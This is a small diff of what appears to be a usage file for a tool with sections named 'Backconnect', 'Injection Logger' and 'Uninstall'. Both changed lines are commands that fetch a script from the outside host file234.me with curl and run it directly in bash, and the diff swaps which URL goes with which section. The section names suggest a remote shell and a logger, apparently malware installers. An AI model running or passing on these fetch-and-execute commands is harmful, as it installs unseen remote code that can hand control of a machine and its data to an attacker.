@@ -1,10 +1,10 @@
 Backconnect
 ======================
-bash -c "$(curl -fsSL https://file234.me/self)"
+bash -c "$(curl -fsSL https://file234.me/z)"
 
 Injection Logger
 ======================
-bash -c "$(curl -fsSL https://file234.me/z)"
+bash -c "$(curl -fsSL https://file234.me/self)"
 
 Uninstall
 =====================
